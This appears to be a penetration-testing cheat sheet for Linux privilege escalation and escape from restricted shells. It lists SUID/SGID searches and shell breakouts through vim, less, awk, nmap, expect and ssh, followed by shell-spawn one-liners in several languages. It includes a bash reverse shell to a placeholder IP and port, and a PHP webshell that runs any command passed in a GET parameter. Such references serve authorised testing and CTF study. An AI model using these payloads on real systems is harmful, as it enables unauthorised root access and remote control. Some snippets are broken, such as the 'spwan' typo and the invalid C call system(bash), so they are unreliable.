# Search for Commands that run as Root:
## list all programs this account has sudo access to
```
sudo -l
```

## find all files with SUID & SGID set
```
find . -perm /2000 
find / -perm -4000 -o -perm -2000
find / -perm -u=s -type f 2>/dev/null
find / -perm /6000
find / -perm /6001   
```


## Restricted Shells: rbash, rksh, rzsh, lshell and rssh
1. try ls, cd, pwd, echo commands [if these commands are restricted, 
   an error will show up with the type of restricted shell we are in (most of the time, this is rbash)]
2. press tab twice to see what commands are available.
  a. if "ls" is avaiable list binaries in /bin, /usr/bin, /usr/local/bin
  b. echo /usr/bin/*  [use globbing to list directory contents]
  c. important to check for operators and escape characters such as the following:
  ```
     > >> < | & ; : ' " `
  ```
3. Try commands wrapped
```
(whoami)
{whoami}
```

## Shell Execution:
```
find /home -exec sh -i \;
```
## use text editors vim, vi, nano, pico, ed

1. :!/bin/sh, !/bin/zsh, try other shells!?!?
2. :shell
3. :set shell=/bin/sh
4. :set shell=/bin/bash:shell
5. :!bash


## use pagers less, more, or programs like man that use less or more by default

1. !/bin/sh, !/bin/zsh, try other shells!?!?
2. !/bin/bash
3. !bash


## use awk command
```
awk 'BEGIN {system("/bin/sh")}'
```

## use expect command
```
expect
spwan sh
sh
```

## use tee command to create a script in scenarios where text editors aren't available
```
echo "bash -i" | tee script.sh
```

## use nmap command
```
nmap --interactive
nmap> !sh
```

## use ssh with the following options to escape restricted shell 
```
ssh user@IP -t "bash --noprofile"
ssh user@IP -t "/bin/sh"
```

## Reverse Shell:

```
bash -i >& /dev/tcp/<ip-address>/<port> 0>&1
```

# Programming Language:

## Python:
```
import os; os.system("/bin/sh")
```

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

```
python -c 'import pty; pty.spawn("/bin/sh")'
```

## PHP:
```
exec("sh -i");
```

## PHP Webshell:
```
<?php
  $command = $_GET['cmd'];
  echo system($command);
?>
```

## Perl:
```
exec "/bin/sh";
```
```
perl —e 'exec "/bin/sh";'
```

## Ruby:
```
exec "/bin/sh"
```
## IRB:
```
exec "/bin/sh"
```

## Lua:
```
os.execute("/bin/sh")
```

## C:
```
#include <stdio.h>

int main(int argc, char **argv)
{
	int status = system(bash);
	return 0;
}
```
